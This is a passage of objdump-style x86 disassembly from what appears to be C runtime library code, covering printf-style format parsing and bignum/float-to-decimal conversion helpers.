  407c54:	mov    edx,DWORD PTR [esp+0x90]
  407c5b:	test   al,0x4
  407c5d:	jne    0x407a1c
  407c63:	fld    QWORD PTR [edx]
  407c65:	lea    eax,[esp+0x34]
  407c69:	add    DWORD PTR [esp+0x90],0x8
  407c71:	fstp   TBYTE PTR [esp]
  407c74:	call   0x406e10
  407c79:	jmp    0x407852
  407c7e:	xchg   ax,ax
  407c80:	mov    DWORD PTR [esp+0x40],0xffffffff
  407c88:	mov    eax,DWORD PTR [esp+0x90]
  407c8f:	lea    ecx,[esp+0x34]
  407c93:	mov    edx,0x1
  407c98:	lea    ebx,[eax+0x4]
  407c9b:	mov    eax,DWORD PTR [eax]
  407c9d:	mov    WORD PTR [esp+0x28],ax
  407ca2:	lea    eax,[esp+0x28]
  407ca6:	call   0x405fb0
  407cab:	mov    DWORD PTR [esp+0x90],ebx
  407cb2:	jmp    0x407852
  407cb7:	mov    esi,esi
  407cb9:	lea    edi,[edi+eiz*1+0x0]
  407cc0:	mov    eax,DWORD PTR [esp+0x38]
  407cc4:	mov    edx,DWORD PTR [esp+0x90]
  407ccb:	test   al,0x4
  407ccd:	jne    0x407b0e
  407cd3:	fld    QWORD PTR [edx]
  407cd5:	lea    eax,[esp+0x34]
  407cd9:	add    DWORD PTR [esp+0x90],0x8
  407ce1:	fstp   TBYTE PTR [esp]
  407ce4:	call   0x407130
  407ce9:	jmp    0x407852
  407cee:	xchg   ax,ax
  407cf0:	test   edi,edi
  407cf2:	jne    0x407eb0
  407cf8:	movzx  edx,WORD PTR [ebx+0x2]
  407cfc:	or     DWORD PTR [esp+0x38],0x200
  407d04:	mov    ebx,ebp
  407d06:	jmp    0x4077d3
  407d0b:	nop
  407d0c:	lea    esi,[esi+eiz*1+0x0]
  407d10:	cmp    edi,0x1
  407d13:	jbe    0x407fee
  407d19:	movzx  edx,WORD PTR [ebx+0x2]
  407d1d:	mov    edi,0x4
  407d22:	mov    ebx,ebp
  407d24:	jmp    0x4077d3
  407d29:	lea    esi,[esi+eiz*1+0x0]
  407d30:	test   edi,edi
  407d32:	jne    0x407dac
  407d34:	movzx  edx,WORD PTR [ebx+0x2]
  407d38:	or     DWORD PTR [esp+0x38],0x400
  407d40:	mov    ebx,ebp
  407d42:	jmp    0x4077d3
  407d47:	mov    esi,esi
  407d49:	lea    edi,[edi+eiz*1+0x0]
  407d50:	test   edi,edi
  407d52:	jne    0x407dac
  407d54:	movzx  edx,WORD PTR [ebx+0x2]
  407d58:	or     DWORD PTR [esp+0x38],0x100
  407d60:	mov    ebx,ebp
  407d62:	jmp    0x4077d3
  407d67:	mov    esi,esi
  407d69:	lea    edi,[edi+eiz*1+0x0]
  407d70:	test   edi,edi
  407d72:	jne    0x407dac
  407d74:	movzx  edx,WORD PTR [ebx+0x2]
  407d78:	or     DWORD PTR [esp+0x38],0x800
  407d80:	mov    ebx,ebp
  407d82:	jmp    0x4077d3
  407d87:	mov    esi,esi
  407d89:	lea    edi,[edi+eiz*1+0x0]
  407d90:	test   edi,edi
  407d92:	jne    0x407dac
  407d94:	movzx  edx,WORD PTR [ebx+0x2]
  407d98:	or     DWORD PTR [esp+0x38],0x40
  407d9d:	mov    ebx,ebp
  407d9f:	jmp    0x4077d3
  407da4:	test   edi,edi
  407da6:	je     0x407ee8
  407dac:	movzx  edx,WORD PTR [ebx+0x2]
  407db0:	mov    ebx,ebp
  407db2:	jmp    0x4077d3
  407db7:	mov    esi,esi
  407db9:	lea    edi,[edi+eiz*1+0x0]
  407dc0:	lea    edx,[esp+0x34]
  407dc4:	call   0x405f50
  407dc9:	jmp    0x407852
  407dce:	xchg   ax,ax
  407dd0:	mov    ecx,DWORD PTR [esp+0x14]
  407dd4:	test   ecx,ecx
  407dd6:	je     0x407d19
  407ddc:	test   edi,0xfffffffd
  407de2:	jne    0x407ed0
  407de8:	mov    eax,DWORD PTR [esp+0x90]
  407def:	mov    edx,DWORD PTR [esp+0x14]
  407df3:	lea    ecx,[eax+0x4]
  407df6:	mov    eax,DWORD PTR [eax]
  407df8:	test   eax,eax
  407dfa:	mov    DWORD PTR [edx],eax
  407dfc:	js     0x408113
  407e02:	movzx  edx,WORD PTR [ebx+0x2]
  407e06:	mov    DWORD PTR [esp+0x90],ecx
  407e0d:	mov    ebx,ebp
  407e0f:	mov    DWORD PTR [esp+0x14],0x0
  407e17:	jmp    0x4077d3
  407e1c:	lea    esi,[esi+eiz*1+0x0]
  407e20:	sub    edx,0x30
  407e23:	cmp    dx,0x9
  407e27:	ja     0x4080ad
  407e2d:	cmp    edi,0x3
  407e30:	ja     0x4080ad
  407e36:	test   edi,edi
  407e38:	jne    0x407eb9
  407e3a:	mov    edi,0x1
  407e3f:	mov    edx,DWORD PTR [esp+0x14]
  407e43:	test   edx,edx
  407e45:	je     0x407dac
  407e4b:	mov    ecx,DWORD PTR [esp+0x14]
  407e4f:	mov    edx,DWORD PTR [ecx]
  407e51:	test   edx,edx
  407e53:	js     0x40800e
  407e59:	lea    edx,[edx+edx*4]
  407e5c:	mov    ecx,DWORD PTR [esp+0x14]
  407e60:	lea    eax,[eax+edx*2-0x30]
  407e64:	movzx  edx,WORD PTR [ebx+0x2]
  407e68:	mov    DWORD PTR [ecx],eax
  407e6a:	jmp    0x407db0
  407e6f:	nop
  407e70:	mov    eax,DWORD PTR [esp+0x90]
  407e77:	mov    ebx,DWORD PTR [eax]
  407e79:	lea    esi,[eax+0x4]
  407e7c:	mov    eax,0x40de50
  407e81:	test   ebx,ebx
  407e83:	cmove  ebx,eax
  407e86:	mov    DWORD PTR [esp],ebx
  407e89:	call   0x40ac90
  407e8e:	lea    ecx,[esp+0x34]
  407e92:	mov    edx,eax
  407e94:	mov    eax,ebx
  407e96:	call   0x405fb0
  407e9b:	mov    DWORD PTR [esp+0x90],esi
  407ea2:	jmp    0x407852
  407ea7:	mov    esi,esi
  407ea9:	lea    edi,[edi+eiz*1+0x0]
  407eb0:	cmp    edi,0x3
  407eb3:	ja     0x4080ad
  407eb9:	cmp    edi,0x2
  407ebc:	mov    edx,0x3
  407ec1:	cmove  edi,edx
  407ec4:	jmp    0x407e3f
  407ec9:	lea    esi,[esi+eiz*1+0x0]
  407ed0:	movzx  edx,WORD PTR [ebx+0x2]
  407ed4:	mov    DWORD PTR [esp+0x14],0x0
  407edc:	mov    edi,0x4
  407ee1:	mov    ebx,ebp
  407ee3:	jmp    0x4077d3
  407ee8:	or     DWORD PTR [esp+0x38],0x1000
  407ef0:	mov    DWORD PTR [esp+0x28],0x0
  407ef8:	call   0x40acf8
  407efd:	lea    ecx,[esp+0x28]
  407f01:	mov    DWORD PTR [esp+0x8],0x10
  407f09:	mov    DWORD PTR [esp+0xc],ecx
  407f0d:	mov    eax,DWORD PTR [eax+0x4]
  407f10:	mov    DWORD PTR [esp+0x4],eax
  407f14:	lea    eax,[esp+0x26]
  407f18:	mov    DWORD PTR [esp],eax
  407f1b:	call   0x40a850
  407f20:	test   eax,eax
  407f22:	jle    0x407f2e
  407f24:	movzx  edx,WORD PTR [esp+0x26]
  407f29:	mov    WORD PTR [esp+0x50],dx
  407f2e:	movzx  edx,WORD PTR [ebx+0x2]
  407f32:	mov    DWORD PTR [esp+0x4c],eax
  407f36:	mov    ebx,ebp
  407f38:	jmp    0x4077d3
  407f3d:	lea    ebp,[ebx+0x4]
  407f40:	movzx  edx,WORD PTR [ebx+0x4]
  407f44:	mov    DWORD PTR [esp+0x10],0x4
  407f4c:	mov    edi,0x4
  407f51:	mov    ebx,ebp
  407f53:	jmp    0x4077d3
  407f58:	lea    ebp,[ebx+0x4]
  407f5b:	movzx  edx,WORD PTR [ebx+0x4]
  407f5f:	mov    DWORD PTR [esp+0x10],0x3
  407f67:	mov    edi,0x4
  407f6c:	mov    ebx,ebp
  407f6e:	jmp    0x4077d3
  407f73:	mov    edx,DWORD PTR [eax+0x4]
  407f76:	mov    eax,DWORD PTR [eax]
  407f78:	mov    DWORD PTR [esp+0x28],eax
  407f7c:	mov    eax,DWORD PTR [esp+0x90]
  407f83:	mov    DWORD PTR [esp+0x2c],edx
  407f87:	add    eax,0x8
  407f8a:	mov    DWORD PTR [esp+0x90],eax
  407f91:	jmp    0x407a92
  407f96:	cmp    WORD PTR [ebx+0x4],0x34
  407f9b:	je     0x408171
  407fa1:	mov    edx,0x36
  407fa6:	mov    DWORD PTR [esp+0x10],0x2
  407fae:	mov    edi,0x4
  407fb3:	mov    ebx,ebp
  407fb5:	jmp    0x4077d3
  407fba:	mov    ecx,DWORD PTR [edi]
  407fbc:	mov    ebx,DWORD PTR [edi+0x4]
  407fbf:	add    edi,0x8
  407fc2:	mov    DWORD PTR [esp+0x90],edi
  407fc9:	mov    DWORD PTR [esp+0x28],ecx
  407fcd:	mov    DWORD PTR [esp+0x2c],ebx
  407fd1:	jmp    0x407b7b
  407fd6:	mov    BYTE PTR [eax],dl
  407fd8:	mov    eax,DWORD PTR [esp+0x90]
  407fdf:	add    eax,0x4
  407fe2:	mov    DWORD PTR [esp+0x90],eax
  407fe9:	jmp    0x407852
  407fee:	lea    eax,[esp+0x40]
  407ff2:	movzx  edx,WORD PTR [ebx+0x2]
  407ff6:	mov    DWORD PTR [esp+0x40],0x0
  407ffe:	mov    edi,0x2
  408003:	mov    ebx,ebp
  408005:	mov    DWORD PTR [esp+0x14],eax
  408009:	jmp    0x4077d3
  40800e:	sub    eax,0x30
  408011:	movzx  edx,WORD PTR [ebx+0x2]
  408015:	mov    ebx,ebp
  408017:	mov    DWORD PTR [ecx],eax
  408019:	jmp    0x4077d3
  40801e:	mov    eax,DWORD PTR [eax]
  408020:	mov    DWORD PTR [esp+0x28],eax
  408024:	sar    eax,0x1f
  408027:	mov    DWORD PTR [esp+0x2c],eax
  40802b:	mov    eax,DWORD PTR [esp+0x90]
  408032:	add    eax,0x4
  408035:	mov    DWORD PTR [esp+0x90],eax
  40803c:	jmp    0x407a92
  408041:	mov    WORD PTR [eax],dx
  408044:	mov    eax,DWORD PTR [esp+0x90]
  40804b:	add    eax,0x4
  40804e:	mov    DWORD PTR [esp+0x90],eax
  408055:	jmp    0x407852
  40805a:	mov    edi,DWORD PTR [edi]
  40805c:	mov    DWORD PTR [esp+0x2c],0x0
  408064:	mov    DWORD PTR [esp+0x28],edi
  408068:	mov    edi,DWORD PTR [esp+0x90]
  40806f:	add    edi,0x4
  408072:	mov    DWORD PTR [esp+0x90],edi
  408079:	jmp    0x407b7b
  40807e:	or     ah,0x2
  408081:	mov    DWORD PTR [esp+0x40],0x8
  408089:	mov    DWORD PTR [esp+0x38],eax
  40808d:	jmp    0x407872
  408092:	lea    ebp,[ebx+0x6]
  408095:	movzx  edx,WORD PTR [ebx+0x6]
  408099:	mov    DWORD PTR [esp+0x10],0x2
  4080a1:	mov    edi,0x4
  4080a6:	mov    ebx,ebp
  4080a8:	jmp    0x4077d3
  4080ad:	lea    edx,[esp+0x34]
  4080b1:	mov    eax,0x25
  4080b6:	mov    ebp,esi
  4080b8:	call   0x405f50
  4080bd:	jmp    0x407852
  4080c2:	movsx  eax,WORD PTR [esp+0x28]
  4080c7:	mov    DWORD PTR [esp+0x90],edx
  4080ce:	mov    DWORD PTR [esp+0x28],eax
  4080d2:	sar    eax,0x1f
  4080d5:	mov    DWORD PTR [esp+0x2c],eax
  4080d9:	jmp    0x407a92
  4080de:	mov    DWORD PTR [eax],edx
  4080e0:	mov    eax,DWORD PTR [esp+0x90]
  4080e7:	add    eax,0x4
  4080ea:	mov    DWORD PTR [esp+0x90],eax
  4080f1:	jmp    0x407852
  4080f6:	movzx  ecx,WORD PTR [esp+0x28]
  4080fb:	mov    DWORD PTR [esp+0x2c],0x0
  408103:	mov    DWORD PTR [esp+0x90],edx
  40810a:	mov    DWORD PTR [esp+0x28],ecx
  40810e:	jmp    0x407b7b
  408113:	test   edi,edi
  408115:	jne    0x40818c
  408117:	or     DWORD PTR [esp+0x38],0x400
  40811f:	neg    DWORD PTR [esp+0x3c]
  408123:	jmp    0x407e02
  408128:	movzx  edx,BYTE PTR [esp+0x28]
  40812d:	mov    DWORD PTR [esp+0x2c],0x0
  408135:	mov    DWORD PTR [esp+0x28],edx
  408139:	jmp    0x407b7b
  40813e:	movsx  eax,BYTE PTR [esp+0x28]
  408143:	mov    DWORD PTR [esp+0x28],eax
  408147:	sar    eax,0x1f
  40814a:	mov    DWORD PTR [esp+0x2c],eax
  40814e:	jmp    0x407a92
  408153:	mov    edi,edx
  408155:	sar    edi,0x1f
  408158:	mov    DWORD PTR [eax+0x4],edi
  40815b:	mov    eax,DWORD PTR [esp+0x90]
  408162:	add    eax,0x4
  408165:	mov    DWORD PTR [esp+0x90],eax
  40816c:	jmp    0x407852
  408171:	lea    ebp,[ebx+0x6]
  408174:	movzx  edx,WORD PTR [ebx+0x6]
  408178:	mov    DWORD PTR [esp+0x10],0x3
  408180:	mov    edi,0x4
  408185:	mov    ebx,ebp
  408187:	jmp    0x4077d3
  40818c:	movzx  edx,WORD PTR [ebx+0x2]
  408190:	mov    DWORD PTR [esp+0x40],0xffffffff
  408198:	mov    ebx,ebp
  40819a:	mov    DWORD PTR [esp+0x90],ecx
  4081a1:	mov    DWORD PTR [esp+0x14],0x0
  4081a9:	jmp    0x4077d3
  4081ae:	nop
  4081af:	nop
  4081b0:	push   ebx
  4081b1:	xor    ebx,ebx
  4081b3:	sub    esp,0x18
  4081b6:	mov    ecx,DWORD PTR [esp+0x20]
  4081ba:	cmp    ecx,0x13
  4081bd:	jle    0x4081d0
  4081bf:	mov    eax,0x4
  4081c4:	add    eax,eax
  4081c6:	add    ebx,0x1
  4081c9:	lea    edx,[eax+0xf]
  4081cc:	cmp    edx,ecx
  4081ce:	jl     0x4081c4
  4081d0:	mov    DWORD PTR [esp],ebx
  4081d3:	call   0x409c10
  4081d8:	mov    DWORD PTR [eax],ebx
  4081da:	add    esp,0x18
  4081dd:	add    eax,0x4
  4081e0:	pop    ebx
  4081e1:	ret    
  4081e2:	lea    esi,[esi+eiz*1+0x0]
  4081e9:	lea    edi,[edi+eiz*1+0x0]
  4081f0:	push   esi
  4081f1:	push   ebx
  4081f2:	sub    esp,0x14
  4081f5:	mov    eax,DWORD PTR [esp+0x28]
  4081f9:	mov    ebx,DWORD PTR [esp+0x20]
  4081fd:	mov    esi,DWORD PTR [esp+0x24]
  408201:	mov    DWORD PTR [esp],eax
  408204:	call   0x4081b0
  408209:	movzx  edx,BYTE PTR [ebx]
  40820c:	lea    ecx,[ebx+0x1]
  40820f:	test   dl,dl
  408211:	mov    BYTE PTR [eax],dl
  408213:	mov    edx,eax
  408215:	je     0x408230
  408217:	mov    esi,esi
  408219:	lea    edi,[edi+eiz*1+0x0]
  408220:	add    ecx,0x1
  408223:	movzx  ebx,BYTE PTR [ecx-0x1]
  408227:	add    edx,0x1
  40822a:	test   bl,bl
  40822c:	mov    BYTE PTR [edx],bl
  40822e:	jne    0x408220
  408230:	test   esi,esi
  408232:	je     0x408236
  408234:	mov    DWORD PTR [esi],edx
  408236:	add    esp,0x14
  408239:	pop    ebx
  40823a:	pop    esi
  40823b:	ret    
  40823c:	lea    esi,[esi+eiz*1+0x0]
  408240:	mov    eax,DWORD PTR [esp+0x4]
  408244:	mov    edx,0x1
  408249:	mov    ecx,DWORD PTR [eax-0x4]
  40824c:	sub    eax,0x4
  40824f:	shl    edx,cl
  408251:	mov    DWORD PTR [eax+0x4],ecx
  408254:	mov    DWORD PTR [eax+0x8],edx
  408257:	mov    DWORD PTR [esp+0x4],eax
  40825b:	jmp    0x409ce0
  408260:	push   ebp
  408261:	push   edi
  408262:	push   esi
  408263:	push   ebx
  408264:	sub    esp,0x4c
  408267:	mov    eax,DWORD PTR [esp+0x64]
  40826b:	mov    edi,DWORD PTR [esp+0x60]
  40826f:	mov    edx,DWORD PTR [eax+0x10]
  408272:	xor    eax,eax
  408274:	cmp    edx,DWORD PTR [edi+0x10]
  408277:	jg     0x408453
  40827d:	mov    eax,DWORD PTR [esp+0x64]
  408281:	mov    esi,DWORD PTR [esp+0x60]
  408285:	add    eax,0x14
  408288:	add    esi,0x14
  40828b:	mov    edi,eax
  40828d:	mov    DWORD PTR [esp+0x38],eax
  408291:	lea    eax,[edx-0x1]
  408294:	xor    edx,edx
  408296:	mov    DWORD PTR [esp+0x2c],esi
  40829a:	mov    DWORD PTR [esp+0x30],eax
  40829e:	shl    eax,0x2
  4082a1:	add    edi,eax
  4082a3:	add    eax,esi
  4082a5:	mov    DWORD PTR [esp+0x28],edi
  4082a9:	mov    edi,DWORD PTR [edi]
  4082ab:	mov    DWORD PTR [esp+0x3c],eax
  4082af:	mov    eax,DWORD PTR [eax]
  4082b1:	lea    ecx,[edi+0x1]
  4082b4:	mov    DWORD PTR [esp+0x10],edi
  4082b8:	div    ecx
  4082ba:	test   eax,eax
  4082bc:	mov    ebp,eax
  4082be:	mov    DWORD PTR [esp+0x34],eax
  4082c2:	je     0x40838f
  4082c8:	mov    edi,DWORD PTR [esp+0x38]
  4082cc:	mov    DWORD PTR [esp+0x20],0x0
  4082d4:	mov    DWORD PTR [esp+0x24],0x0
  4082dc:	mov    DWORD PTR [esp+0x10],0x0
  4082e4:	mov    DWORD PTR [esp+0x14],0x0
  4082ec:	lea    esi,[esi+eiz*1+0x0]
  4082f0:	add    edi,0x4
  4082f3:	mov    eax,ebp
  4082f5:	mov    ecx,DWORD PTR [esi]
  4082f7:	mul    DWORD PTR [edi-0x4]
  4082fa:	mov    DWORD PTR [esp+0x1c],0x0
  408302:	add    eax,DWORD PTR [esp+0x20]
  408306:	adc    edx,DWORD PTR [esp+0x24]
  40830a:	xor    ebx,ebx
  40830c:	mov    DWORD PTR [esp+0x24],ebx
  408310:	xor    ebx,ebx
  408312:	mov    DWORD PTR [esp+0x18],eax
  408316:	sub    ecx,DWORD PTR [esp+0x18]
  40831a:	sbb    ebx,DWORD PTR [esp+0x1c]
  40831e:	sub    ecx,DWORD PTR [esp+0x10]
  408322:	sbb    ebx,DWORD PTR [esp+0x14]
  408326:	add    esi,0x4
  408329:	mov    DWORD PTR [esp+0x20],edx
  40832d:	mov    DWORD PTR [esp+0x14],0x0
  408335:	mov    eax,ebx
  408337:	mov    DWORD PTR [esi-0x4],ecx
  40833a:	and    eax,0x1
  40833d:	cmp    DWORD PTR [esp+0x28],edi
  408341:	mov    DWORD PTR [esp+0x10],eax
  408345:	jae    0x4082f0
  408347:	mov    eax,DWORD PTR [esp+0x3c]
  40834b:	mov    edx,DWORD PTR [eax]
  40834d:	test   edx,edx
  40834f:	jne    0x40838f
  408351:	mov    esi,DWORD PTR [esp+0x2c]
  408355:	mov    edi,eax
  408357:	sub    eax,0x4
  40835a:	cmp    esi,eax
  40835c:	jae    0x408384
  40835e:	mov    edi,DWORD PTR [edi-0x4]
  408361:	test   edi,edi
  408363:	jne    0x408384
  408365:	mov    ecx,esi
  408367:	mov    edx,DWORD PTR [esp+0x30]
  40836b:	jmp    0x408376
  40836d:	lea    esi,[esi+0x0]
  408370:	mov    ebx,DWORD PTR [eax]
  408372:	test   ebx,ebx
  408374:	jne    0x408380
  408376:	sub    eax,0x4
  408379:	sub    edx,0x1
  40837c:	cmp    ecx,eax
  40837e:	jb     0x408370
  408380:	mov    DWORD PTR [esp+0x30],edx
  408384:	mov    eax,DWORD PTR [esp+0x60]
  408388:	mov    edi,DWORD PTR [esp+0x30]
  40838c:	mov    DWORD PTR [eax+0x10],edi
  40838f:	mov    eax,DWORD PTR [esp+0x64]
  408393:	mov    DWORD PTR [esp+0x4],eax
  408397:	mov    eax,DWORD PTR [esp+0x60]
  40839b:	mov    DWORD PTR [esp],eax
  40839e:	call   0x40a290
  4083a3:	test   eax,eax
  4083a5:	js     0x40844f
  4083ab:	xor    esi,esi
  4083ad:	xor    edi,edi
  4083af:	lea    eax,[ebp+0x1]
  4083b2:	mov    DWORD PTR [esp+0x10],esi
  4083b6:	mov    DWORD PTR [esp+0x14],edi
  4083ba:	mov    ebp,DWORD PTR [esp+0x2c]
  4083be:	mov    esi,DWORD PTR [esp+0x38]
  4083c2:	mov    edi,DWORD PTR [esp+0x28]
  4083c6:	mov    DWORD PTR [esp+0x34],eax
  4083ca:	lea    esi,[esi+0x0]
  4083d0:	add    esi,0x4
  4083d3:	mov    eax,DWORD PTR [ebp+0x0]
  4083d6:	mov    ecx,DWORD PTR [esi-0x4]
  4083d9:	xor    ebx,ebx
  4083db:	xor    edx,edx
  4083dd:	sub    eax,ecx
  4083df:	sbb    edx,ebx
  4083e1:	sub    eax,DWORD PTR [esp+0x10]
  4083e5:	sbb    edx,DWORD PTR [esp+0x14]
  4083e9:	add    ebp,0x4
  4083ec:	mov    DWORD PTR [esp+0x14],0x0
  4083f4:	mov    ebx,edx
  4083f6:	mov    DWORD PTR [ebp-0x4],eax
  4083f9:	and    ebx,0x1
  4083fc:	cmp    edi,esi
  4083fe:	mov    DWORD PTR [esp+0x10],ebx
  408402:	jae    0x4083d0
  408404:	mov    edi,DWORD PTR [esp+0x30]
  408408:	mov    eax,DWORD PTR [esp+0x2c]
  40840c:	lea    edx,[eax+edi*4]
  40840f:	mov    edi,DWORD PTR [edx]
  408411:	test   edi,edi
  408413:	jne    0x40844f
  408415:	mov    edi,DWORD PTR [esp+0x2c]
  408419:	lea    eax,[edx-0x4]
  40841c:	cmp    edi,eax
  40841e:	jae    0x408444
  408420:	mov    esi,DWORD PTR [edx-0x4]
  408423:	test   esi,esi
  408425:	jne    0x408444
  408427:	mov    ecx,edi
  408429:	mov    edx,DWORD PTR [esp+0x30]
  40842d:	jmp    0x408436
  40842f:	nop
  408430:	mov    ebx,DWORD PTR [eax]
  408432:	test   ebx,ebx
  408434:	jne    0x408440
  408436:	sub    eax,0x4
  408439:	sub    edx,0x1
  40843c:	cmp    ecx,eax
  40843e:	jb     0x408430
  408440:	mov    DWORD PTR [esp+0x30],edx
  408444:	mov    eax,DWORD PTR [esp+0x60]
  408448:	mov    edi,DWORD PTR [esp+0x30]
  40844c:	mov    DWORD PTR [eax+0x10],edi
  40844f:	mov    eax,DWORD PTR [esp+0x34]
  408453:	add    esp,0x4c
  408456:	pop    ebx
  408457:	pop    esi
  408458:	pop    edi
  408459:	pop    ebp
  40845a:	ret    
  40845b:	nop
  40845c:	nop
  40845d:	nop
  40845e:	nop
  40845f:	nop
  408460:	push   ebp
  408461:	push   edi
  408462:	push   esi
  408463:	push   ebx
  408464:	sub    esp,0x7c
  408467:	mov    eax,DWORD PTR [esp+0x9c]
  40846e:	mov    edi,DWORD PTR [esp+0x9c]
  408475:	mov    ebx,DWORD PTR [eax]
  408477:	mov    eax,ebx
  408479:	and    eax,0xffffffcf
  40847c:	mov    DWORD PTR [edi],eax
  40847e:	mov    eax,ebx
  408480:	and    eax,0x7
  408483:	cmp    eax,0x4
  408486:	ja     0x409993
  40848c:	jmp    DWORD PTR [eax*4+0x40dff8]
  408493:	mov    eax,DWORD PTR [esp+0x90]
  40849a:	xor    edx,edx
  40849c:	mov    esi,DWORD PTR [eax]
  40849e:	cmp    esi,0x20
  4084a1:	jle    0x4084b9
  4084a3:	mov    eax,0x20
  4084a8:	nop
  4084a9:	lea    esi,[esi+eiz*1+0x0]
  4084b0:	add    eax,eax
  4084b2:	add    edx,0x1
  4084b5:	cmp    esi,eax
  4084b7:	jg     0x4084b0
  4084b9:	mov    DWORD PTR [esp],edx
  4084bc:	call   0x409c10
  4084c1:	mov    edi,DWORD PTR [esp+0x98]
  4084c8:	mov    ebp,eax
  4084ca:	lea    eax,[esi-0x1]
  4084cd:	lea    ecx,[ebp+0x14]
  4084d0:	mov    edx,DWORD PTR [esp+0x98]
  4084d7:	sar    eax,0x5
  4084da:	lea    edi,[edi+eax*4]
  4084dd:	mov    DWORD PTR [esp+0x10],ecx
  4084e1:	mov    eax,ecx
  4084e3:	mov    ecx,DWORD PTR [edx]
  4084e5:	add    edx,0x4
  4084e8:	add    eax,0x4
  4084eb:	cmp    edi,edx
  4084ed:	mov    DWORD PTR [eax-0x4],ecx
  4084f0:	jae    0x4084e3
  4084f2:	mov    ecx,DWORD PTR [esp+0x10]
  4084f6:	sub    eax,ecx
  4084f8:	sar    eax,0x2
  4084fb:	jmp    0x40850a
  4084fd:	lea    esi,[esi+0x0]
  408500:	test   edx,edx
  408502:	mov    eax,edx
  408504:	je     0x4089d1
  40850a:	lea    edx,[eax-0x1]
  40850d:	mov    edi,DWORD PTR [ecx+edx*4]
  408510:	test   edi,edi
  408512:	je     0x408500
  408514:	bsr    edx,DWORD PTR [ebp+eax*4+0x10]
  408519:	mov    DWORD PTR [ebp+0x10],eax
  40851c:	shl    eax,0x5
  40851f:	xor    edx,0x1f
  408522:	sub    eax,edx
  408524:	mov    DWORD PTR [esp+0x28],eax
  408528:	mov    DWORD PTR [esp],ebp
  40852b:	call   0x409ac0
  408530:	mov    edi,DWORD PTR [esp+0x94]
  408537:	test   eax,eax
  408539:	mov    DWORD PTR [esp+0x6c],eax
  40853d:	mov    DWORD PTR [esp+0x30],edi
  408541:	jne    0x4089e5
  408547:	mov    ecx,DWORD PTR [ebp+0x10]
  40854a:	test   ecx,ecx
  40854c:	jne    0x408600
  408552:	mov    DWORD PTR [esp],ebp
  408555:	call   0x409ce0
  40855a:	mov    eax,DWORD PTR [esp+0xa8]
  408561:	mov    DWORD PTR [eax],0x1
  408567:	mov    eax,DWORD PTR [esp+0xac]
  40856e:	mov    DWORD PTR [esp+0x8],0x1
  408576:	mov    DWORD PTR [esp],0x40dff5
  40857d:	mov    DWORD PTR [esp+0x4],eax
  408581:	call   0x4081f0
  408586:	add    esp,0x7c
  408589:	pop    ebx
  40858a:	pop    esi
  40858b:	pop    edi
  40858c:	pop    ebp
  40858d:	ret    
  40858e:	xchg   ax,ax
  408590:	mov    eax,DWORD PTR [esp+0xa8]
  408597:	mov    DWORD PTR [eax],0xffff8000
  40859d:	mov    eax,DWORD PTR [esp+0xac]
  4085a4:	mov    DWORD PTR [esp+0x8],0x3
  4085ac:	mov    DWORD PTR [esp],0x40dff1
  4085b3:	mov    DWORD PTR [esp+0x4],eax
  4085b7:	call   0x4081f0
  4085bc:	add    esp,0x7c
  4085bf:	pop    ebx
  4085c0:	pop    esi
  4085c1:	pop    edi
  4085c2:	pop    ebp
  4085c3:	ret    
  4085c4:	mov    eax,DWORD PTR [esp+0xa8]
  4085cb:	mov    DWORD PTR [eax],0xffff8000
  4085d1:	mov    eax,DWORD PTR [esp+0xac]
  4085d8:	mov    DWORD PTR [esp+0x8],0x8
  4085e0:	mov    DWORD PTR [esp],0x40dfe8
  4085e7:	mov    DWORD PTR [esp+0x4],eax
  4085eb:	call   0x4081f0
  4085f0:	add    esp,0x7c
  4085f3:	pop    ebx
  4085f4:	pop    esi
  4085f5:	pop    edi
  4085f6:	pop    ebp
  4085f7:	ret    
  4085f8:	nop
  4085f9:	lea    esi,[esi+eiz*1+0x0]
  408600:	lea    eax,[esp+0x6c]
  408604:	mov    DWORD PTR [esp],ebp
  408607:	mov    DWORD PTR [esp+0x4],eax
  40860b:	call   0x40a480
  408610:	fstp   QWORD PTR [esp+0x10]
  408614:	mov    edx,DWORD PTR [esp+0x14]
  408618:	mov    eax,DWORD PTR [esp+0x10]
  40861c:	mov    edi,DWORD PTR [esp+0x30]
  408620:	mov    ecx,DWORD PTR [esp+0x28]
  408624:	and    edx,0xfffff
  40862a:	mov    DWORD PTR [esp+0x10],eax
  40862e:	or     edx,0x3ff00000
  408634:	lea    ecx,[edi+ecx*1-0x1]
  408638:	mov    DWORD PTR [esp+0x14],edx
  40863c:	fld    QWORD PTR [esp+0x10]
  408640:	mov    DWORD PTR [esp+0x1c],ecx
  408644:	mov    edi,ecx
  408646:	sar    edi,0x1f
  408649:	fsub   DWORD PTR ds:0x40e00c
  40864f:	mov    eax,edi
  408651:	xor    eax,ecx
  408653:	sub    eax,edi
  408655:	sub    eax,0x435
  40865a:	test   eax,eax
  40865c:	fmul   QWORD PTR ds:0x40e010
  408662:	fld    QWORD PTR ds:0x40e018
  408668:	faddp  st(1),st
  40866a:	fild   DWORD PTR [esp+0x1c]
  40866e:	fmul   QWORD PTR ds:0x40e020
  408674:	faddp  st(1),st
  408676:	jle    0x408688
  408678:	mov    DWORD PTR [esp+0x1c],eax
  40867c:	fild   DWORD PTR [esp+0x1c]
  408680:	fmul   QWORD PTR ds:0x40e028
  408686:	faddp  st(1),st
  408688:	fnstcw WORD PTR [esp+0x5e]
  40868c:	movzx  eax,WORD PTR [esp+0x5e]
  408691:	mov    ah,0xc
  408693:	mov    WORD PTR [esp+0x5c],ax
  408698:	fldcw  WORD PTR [esp+0x5c]
  40869c:	fist   DWORD PTR [esp+0x1c]
  4086a0:	fldcw  WORD PTR [esp+0x5e]
  4086a4:	fldz   
  4086a6:	fucomip st,st(1)
  4086a8:	ja     0x408f10
  4086ae:	fstp   st(0)
  4086b0:	mov    eax,ecx
  4086b2:	mov    DWORD PTR [esp+0x44],0x1
  4086ba:	shl    eax,0x14
  4086bd:	add    eax,edx
  4086bf:	cmp    DWORD PTR [esp+0x1c],0x16
  4086c4:	mov    DWORD PTR [esp+0x14],eax
  4086c8:	ja     0x4086f2
  4086ca:	mov    eax,DWORD PTR [esp+0x1c]
  4086ce:	fld    QWORD PTR [eax*8+0x40e0c0]
  4086d5:	fld    QWORD PTR [esp+0x10]
  4086d9:	fxch   st(1)
  4086db:	fucomip st,st(1)
  4086dd:	fstp   st(0)
  4086df:	jbe    0x408a30
  4086e5:	sub    DWORD PTR [esp+0x1c],0x1
  4086ea:	mov    DWORD PTR [esp+0x44],0x0
  4086f2:	mov    eax,DWORD PTR [esp+0x28]
  4086f6:	mov    DWORD PTR [esp+0x34],0x0
  4086fe:	sub    eax,ecx
